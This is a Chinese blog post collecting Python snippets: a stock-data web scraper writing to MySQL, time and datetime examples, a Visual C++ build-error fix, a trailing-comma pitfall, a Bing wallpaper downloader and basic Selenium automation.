      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/26/python代码段收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/26/python代码段收集/" itemprop="url">python代码段收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-26T19:45:56+08:00">
                2019-02-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  15.8k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  82 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="5-行代码入门-Python-爬虫"><a href="#5-行代码入门-Python-爬虫" class="headerlink" title="5 行代码入门 Python 爬虫"></a>5 行代码入门 Python 爬虫</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line">from urllib.parse import urlencode  # 编码 URL 字符串https://www.makcyun.top/web_scraping_withpython18.html</span><br><span class="line"></span><br><span class="line">start_time = time.time()  #计算程序运行时间</span><br><span class="line">def get_one_page(i):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36'</span></span><br><span class="line">        &#125;</span><br><span class="line">		paras = &#123;</span><br><span class="line">		<span class="string">'reportTime'</span>: <span class="string">'2017-12-31'</span>,</span><br><span class="line">		#可以改报告日期，比如2018-6-30获得的就是该季度的信息</span><br><span class="line">		'pageNum': i   #页码</span><br><span class="line">		&#125;</span><br><span class="line">		url = <span class="string">'http://s.askci.com/stock/a/?'</span> + urlencode(paras)</span><br><span class="line">		response = requests.get(url,headers = headers)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">return</span> response.text</span><br><span class="line">		<span class="keyword">return</span> None</span><br><span class="line">	except RequestException:</span><br><span class="line">		print(<span class="string">'爬取失败'</span>)</span><br><span class="line"></span><br><span class="line">def parse_one_page(html):</span><br><span class="line">	soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">	content = soup.select('#myTable04')[0] #[0]将返回的list改为bs4类型</span><br><span class="line">	tbl = pd.read_html(content.prettify(),header = <span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line">	# prettify()优化代码,[0]从pd.read_html返回的list中提取出DataFrame</span><br><span class="line">	tbl.rename(columns = &#123;<span class="string">'序号'</span>:<span class="string">'serial_number'</span>, <span class="string">'股票代码'</span>:<span class="string">'stock_code'</span>, <span class="string">'股票简称'</span>:<span class="string">'stock_abbre'</span>, <span class="string">'公司名称'</span>:<span class="string">'company_name'</span>, <span class="string">'省份'</span>:<span class="string">'province'</span>, <span class="string">'城市'</span>:<span class="string">'city'</span>, <span class="string">'主营业务收入(201712)'</span>:<span class="string">'main_bussiness_income'</span>, <span class="string">'净利润(201712)'</span>:<span class="string">'net_profit'</span>, <span class="string">'员工人数'</span>:<span class="string">'employees'</span>, <span class="string">'上市日期'</span>:<span class="string">'listing_date'</span>, <span class="string">'招股书'</span>:<span class="string">'zhaogushu'</span>, <span class="string">'公司财报'</span>:<span class="string">'financial_report'</span>, <span class="string">'行业分类'</span>:<span class="string">'industry_classification'</span>, <span class="string">'产品类型'</span>:<span class="string">'industry_type'</span>, <span class="string">'主营业务'</span>:<span class="string">'main_business'</span>&#125;,inplace = True)</span><br><span class="line">	<span class="keyword">return</span> tbl</span><br><span class="line"></span><br><span class="line">def generate_mysql():</span><br><span class="line">	conn = pymysql.connect(</span><br><span class="line">		host=<span class="string">'localhost'</span>,</span><br><span class="line">		user=<span class="string">'root'</span>,</span><br><span class="line">		password=<span class="string">'******'</span>,</span><br><span class="line">		port=<span class="number">3306</span>,</span><br><span class="line">		charset = <span class="string">'utf8'</span>,  </span><br><span class="line">		db = <span class="string">'wade'</span>)</span><br><span class="line">	cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">	sql = <span class="string">'CREATE TABLE IF NOT EXISTS listed_company (serial_number INT(20) NOT NULL,stock_code INT(20) ,stock_abbre VARCHAR(20) ,company_name VARCHAR(20) ,province VARCHAR(20) ,city VARCHAR(20) ,main_bussiness_income VARCHAR(20) ,net_profit VARCHAR(20) ,employees INT(20) ,listing_date DATETIME(0) ,zhaogushu VARCHAR(20) ,financial_report VARCHAR(20) , industry_classification VARCHAR(20) ,industry_type VARCHAR(100) ,main_business VARCHAR(200) ,PRIMARY KEY (serial_number))'</span></span><br><span class="line">	cursor.execute(sql)</span><br><span class="line">	conn.close()</span><br><span class="line">	</span><br><span class="line">def write_to_sql(tbl, db = <span class="string">'wade'</span>):</span><br><span class="line">    engine = create_engine(<span class="string">'mysql+pymysql://root:******@localhost:3306/&#123;0&#125;?charset=utf8'</span>.format(db))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    	tbl.to_sql(<span class="string">'listed_company2'</span>,con = engine,if_exists=<span class="string">'append'</span>,index=False)</span><br><span class="line">    	# append表示在原有表基础上增加，但该表要有表头</span><br><span class="line">    except Exception <span class="keyword">as</span> e:</span><br><span class="line">    	print(e)</span><br><span class="line"></span><br><span class="line">def main(page):</span><br><span class="line">    generate_mysql()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,page):  </span><br><span class="line">		html = get_one_page(i)</span><br><span class="line">		tbl = parse_one_page(html)</span><br><span class="line">		write_to_sql(tbl)</span><br><span class="line">		</span><br><span class="line"># # 单进程</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:	</span><br><span class="line">	main(<span class="number">178</span>)</span><br><span class="line">	endtime = time.time()-start_time</span><br><span class="line">	print(<span class="string">'程序运行了%.2f秒'</span> %endtime)</span><br><span class="line">	</span><br><span class="line"># 多进程</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> 	pool = Pool(<span class="number">4</span>)</span><br><span class="line"> 	pool.map(main, [i for i in range(1,178)])  #共有178页</span><br><span class="line">	endtime = time.time()-start_time</span><br><span class="line">	print(<span class="string">'程序运行了%.2f秒'</span> %(time.time()-start_time))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">for i in range(1,178):  # 爬取全部页</span><br><span class="line">	tb = pd.read_html(<span class="string">'http://s.askci.com/stock/a/?reportTime=2017-12-31&amp;pageNum=%s'</span> % (str(i)))[<span class="number">3</span>] </span><br><span class="line">	tb.to_csv(r<span class="string">'1.csv'</span>, mode=<span class="string">'a'</span>, encoding=<span class="string">'utf_8_sig'</span>, header=<span class="number">1</span>, index=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="时间处理"><a href="#时间处理" class="headerlink" title="时间处理"></a>时间处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># author:           inpurer(月小水长)</span><br><span class="line"># pc_type           lenovo</span><br><span class="line"># create_date:      2018/12/3</span><br><span class="line"># file_name:        timetest.py</span><br><span class="line"># description:      月小水长，热血未凉</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t0 = time.time()</span><br><span class="line">#description:   输出当前时间距离1970.1.1的秒数,精确到小数点后6位，也叫做时间戳</span><br><span class="line">#output sample: 1543799532.602318</span><br><span class="line">print(t0)</span><br><span class="line"></span><br><span class="line">t1 = time.localtime(t0)</span><br><span class="line">#description:   把时间戳转成元组,包含七个元素,前六个见名知意,tm_wday是指今天是当前周的第几天(index from 0),tm_yday类似,tm_isdst是否是夏令时,不用关心</span><br><span class="line">#output sample: time.struct_time(tm_year=2018, tm_mon=12, tm_mday=3, tm_hour=9, tm_min=22, tm_sec=24, tm_wday=0, tm_yday=337, tm_isdst=0)</span><br><span class="line">print(t1)</span><br><span class="line">#so,可以这样输出今天是今年的第多少天</span><br><span class="line">print(t1[<span class="number">-2</span>]+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#下面是对该元组的格式化</span><br><span class="line"></span><br><span class="line">#description:   简单可读形式</span><br><span class="line">#output sample: Mon Dec  3 09:31:18 2018</span><br><span class="line">t2 = time.asctime(t1)</span><br><span class="line">print(t2)</span><br><span class="line"></span><br><span class="line">#description:   可通过参数设置成各种形式，下面是一种标准形式,各参数见名知意</span><br><span class="line">#output sample: 2018-12-03 09:33:36</span><br><span class="line">t3 = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, t1)</span><br><span class="line">print(t3)</span><br><span class="line">#%y 两位数的年份表示（00-99）</span><br><span class="line"># %Y 四位数的年份表示（000-9999）</span><br><span class="line"># %m 月份（01-12）</span><br><span class="line"># %d 月内中的一天（0-31）</span><br><span class="line"># %H 24小时制小时数（0-23）</span><br><span class="line"># %I 12小时制小时数（01-12）</span><br><span class="line"># %M 分钟数（00=59）</span><br><span class="line"># %S 秒（00-59）</span><br><span class="line">#</span><br><span class="line"># %a 本地简化星期名称</span><br><span class="line"># %A 本地完整星期名称</span><br><span class="line"># %b 本地简化的月份名称</span><br><span class="line"># %B 本地完整的月份名称</span><br><span class="line"># %c 本地相应的日期表示和时间表示</span><br><span class="line"># %j 年内的一天（001-366）</span><br><span class="line"># %p 本地A.M.或P.M.的等价符</span><br><span class="line"># %U 一年中的星期数（00-53）星期天为星期的开始</span><br><span class="line"># %w 星期（0-6），星期天为星期的开始</span><br><span class="line"># %W 一年中的星期数（00-53）星期一为星期的开始</span><br><span class="line"># %x 本地相应的日期表示</span><br><span class="line"># %X 本地相应的时间表示</span><br><span class="line"># %Z 当前时区的名称</span><br><span class="line"># %% %号本身</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面是把格式化字符串转成元组</span><br><span class="line"># description:      第一个参数个格式化后的字符串,后一个参数和格式化对应，便于反格式化</span><br><span class="line"># output sample:    time.struct_time(tm_year=2018, tm_mon=12, tm_mday=3, tm_hour=9, tm_min=47, tm_sec=7, tm_wday=0, tm_yday=337, tm_isdst=-1)</span><br><span class="line">t4 = time.strptime(t3,<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">print(t4)</span><br><span class="line"></span><br><span class="line"># 把元组转成时间戳</span><br><span class="line">#description:   是time.localtime的反函数,不过由于格式化的原因，精度有所下降</span><br><span class="line">#output sample: 1543801627.0</span><br><span class="line">t5 = time.mktime(t4)</span><br><span class="line">print(t5)</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># author:           inpurer(月小水长)</span><br><span class="line"># pc_type           lenovo</span><br><span class="line"># create_date:      2018/12/3</span><br><span class="line"># file_name:        timetest.py</span><br><span class="line"># description:      月小水长，热血未凉</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">#通过datetime.datetime.now()可以获得当前日期时间的一个实例</span><br><span class="line">#这个实例是一个datetime类对象而不是字符串</span><br><span class="line">#虽然直接打印该实例输出的是一个字符串,只是调用datetime实现的__str__方法而已</span><br><span class="line">t0 = datetime.datetime.now()</span><br><span class="line">print(t0)           #print: 2018-12-03 12:55:49.905971</span><br><span class="line">print(type(t0))     #print: &lt;class 'datetime.datetime'&gt;</span><br><span class="line"></span><br><span class="line">#然后就可以通过对象名.的方法输出各个时间信息,该信息是一个int类型</span><br><span class="line">print(t0.year)          #print: 2018</span><br><span class="line">print(type(t0.year))    #print: &lt;class 'int'&gt;</span><br><span class="line">print(t0.month)</span><br><span class="line">print(t0.day)</span><br><span class="line">print(t0.hour)</span><br><span class="line">print(t0.minute)</span><br><span class="line">print(t0.second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">t0 = datetime.datetime.now()</span><br><span class="line">#注意year/month/day都是int类型，不像java那样可以直接拼接字符串和数字</span><br><span class="line">wanted_time = str(t0.year)+<span class="string">"-"</span>+str(t0.month)+<span class="string">"-"</span>+str(t0.day)</span><br><span class="line">#https://inspurer.github.io/2018/12/03/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9Apython%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86/</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t0 = time.localtime()</span><br><span class="line">wanted_time = time.strftime(<span class="string">"%Y-%m-%d"</span>,t0)</span><br></pre></td></tr></table></figure>
<h3 id="error-Microsoft-Visual-C-14-0-is-required"><a href="#error-Microsoft-Visual-C-14-0-is-required" class="headerlink" title="error: Microsoft Visual C++ 14.0 is required"></a>error: Microsoft Visual C++ 14.0 is required</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">源码安装，但是没有 C++ 的编译环境</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">error: Microsoft Visual C++ <span class="number">14.0</span> is required. Get it <span class="keyword">with</span> <span class="string">"Microsoft Visual</span></span><br><span class="line"><span class="string">C++ Build Tools"</span>: http:<span class="comment">//landinghub.visualstudio.com/visual-cpp-build-tools</span></span><br><span class="line">如果是 Python <span class="number">27</span> 可以安装 Microsoft Visual C++ Compiler <span class="keyword">for</span> Python  <span class="number">2.7</span> https:<span class="comment">//www.microsoft.com/en-us/download/details.aspx?id=44266</span></span><br><span class="line">如果是 Python <span class="number">3</span> 可以安装 Visual C++ <span class="number">2015</span> Build Tools http:<span class="comment">//landinghub.visualstudio.com/visual-cpp-build-tools</span></span><br><span class="line">或者使用下载编译好的 exe 文件</span><br><span class="line">或者使用 whl 格式的包</span><br></pre></td></tr></table></figure>
<h3 id="逗号引发的悲剧"><a href="#逗号引发的悲剧" class="headerlink" title="逗号引发的悲剧"></a>逗号引发的悲剧</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = [</span><br><span class="line">...     <span class="string">'foo'</span></span><br><span class="line">...     <span class="string">'bar'</span>,</span><br><span class="line">...     <span class="string">'tree'</span></span><br><span class="line">... ]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; b = <span class="string">'foo'</span> <span class="string">'bar'</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; print a</span><br><span class="line">[<span class="string">'foobar'</span>, <span class="string">'tree'</span>]</span><br><span class="line">&gt;&gt;&gt; print b</span><br><span class="line">foobar</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">也就是说 <span class="string">'foo'</span> + <span class="string">'bar'</span> 等价于 <span class="string">'foo'</span> <span class="string">'bar'</span></span><br><span class="line"></span><br><span class="line">再来看另外一个例子，注意第二行后面的逗号</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; a = &#123;<span class="string">'foo'</span>: <span class="string">'bar'</span>&#125;</span><br><span class="line">&gt;&gt;&gt; b = a.get(<span class="string">'foo'</span>),</span><br><span class="line">&gt;&gt;&gt; c = a.get(<span class="string">'foo'</span>)</span><br><span class="line">&gt;&gt;&gt; print(b)</span><br><span class="line">(<span class="string">'bar'</span>,)</span><br><span class="line">&gt;&gt;&gt; print(c)</span><br><span class="line">bar</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">本来 b 应该是一个字符串，结果硬是变成了元组。https:<span class="comment">//www.restran.net/2015/11/07/python-comma-issue/</span></span><br></pre></td></tr></table></figure>
<h3 id="Python获取Bing图片做壁纸"><a href="#Python获取Bing图片做壁纸" class="headerlink" title="Python获取Bing图片做壁纸"></a>Python获取Bing图片做壁纸</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//jeffyang.top/Python/python%E8%8E%B7%E5%8F%96Bing%E5%9B%BE%E7%89%87%E5%81%9A%E5%A3%81%E7%BA%B8/</span></span><br><span class="line">def get_url(day=<span class="number">0</span>):</span><br><span class="line">    url = <span class="string">"https://www.bing.com/HPImageArchive.aspx?format=js&amp;idx="</span> + str(day) + <span class="string">"&amp;n=1&amp;nc=1509675905008&amp;pid=hp&amp;video=1"</span></span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line">def get_img(url, path=<span class="string">"D://wallpaper/"</span>):</span><br><span class="line">    isExists = os.path.exists(path)#https://github.com/JianFengY/BingSpider</span><br><span class="line">    <span class="keyword">if</span> not isExists:</span><br><span class="line">        os.makedirs(path) </span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    content = html.json()</span><br><span class="line">    src = <span class="string">"https://www.bing.com"</span> + content[<span class="string">'images'</span>][<span class="number">0</span>][<span class="string">'url'</span>]</span><br><span class="line">    urlretrieve(src, path + content[<span class="string">'images'</span>][<span class="number">0</span>][<span class="string">'enddate'</span>] + <span class="string">'.jpg'</span>)</span><br><span class="line">def set_wallpaper_from_bmp(bmp_path):  </span><br><span class="line">    reg_key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, <span class="string">"Control Panel\\Desktop"</span>, <span class="number">0</span>, win32con.KEY_SET_VALUE)    </span><br><span class="line">    win32api.RegSetValueEx(reg_key, <span class="string">"WallpaperStyle"</span>, <span class="number">0</span>, win32con.REG_SZ, <span class="string">"2"</span>)  </span><br><span class="line">    win32api.RegSetValueEx(reg_key, <span class="string">"TileWallpaper"</span>, <span class="number">0</span>, win32con.REG_SZ, <span class="string">"0"</span>)  </span><br><span class="line">    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, bmp_path, win32con.SPIF_SENDWININICHANGE)  </span><br><span class="line">def set_wallpaper(img_path):  </span><br><span class="line">    isExists = os.path.exists(img_path)</span><br><span class="line">    <span class="keyword">if</span> isExists:</span><br><span class="line">        img_dir = os.path.dirname(img_path)  </span><br><span class="line">        bmpImage = Image.open(img_path)  </span><br><span class="line">        new_bmp_path = os.path.join(img_dir, <span class="string">'wallpaper.bmp'</span>)  </span><br><span class="line">        bmpImage.save(new_bmp_path, <span class="string">"BMP"</span>)  </span><br><span class="line">        set_wallpaper_from_bmp(new_bmp_path)  </span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> False</span><br></pre></td></tr></table></figure>
<h3 id="自动化测试工具from-selenium-import-webdriver"><a href="#自动化测试工具from-selenium-import-webdriver" class="headerlink" title="自动化测试工具from selenium import webdriver"></a>自动化测试工具from selenium import webdriver</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">           <span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">           <span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">           <span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line">           <span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line">           </span><br><span class="line">           browser = webdriver.Chrome()</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">               input = browser.find_element_by_id(<span class="string">'kw'</span>)</span><br><span class="line">               input.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">               input.send_keys(Keys.ENTER)</span><br><span class="line">               wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line">               wait.until(EC.presence_of_element_located((By.ID, <span class="string">'content_left'</span>)))</span><br><span class="line">               print(browser.current_url)</span><br><span class="line">               print(browser.get_cookies())</span><br><span class="line">               print(browser.page_source)</span><br><span class="line">           <span class="keyword">finally</span>:</span><br><span class="line">               browser.close()</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.scrollTo(0, document.body.scrollHeight)'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'alert("To Bottom")'</span>)</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">input = browser.find_element_by_class_name(<span class="string">'zu-top-add-question'</span>)</span><br><span class="line">print(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">except TimeoutException:</span><br><span class="line">    print(<span class="string">'Time Out'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.find_element_by_id(<span class="string">'hello'</span>)</span><br><span class="line">except NoSuchElementException:</span><br><span class="line">    print(<span class="string">'No Element'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br><span class="line">    </span><br><span class="line">    http:<span class="comment">//jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93selenium%E8%AF%A6%E8%A7%A3/</span></span><br></pre></td></tr></table></figure>
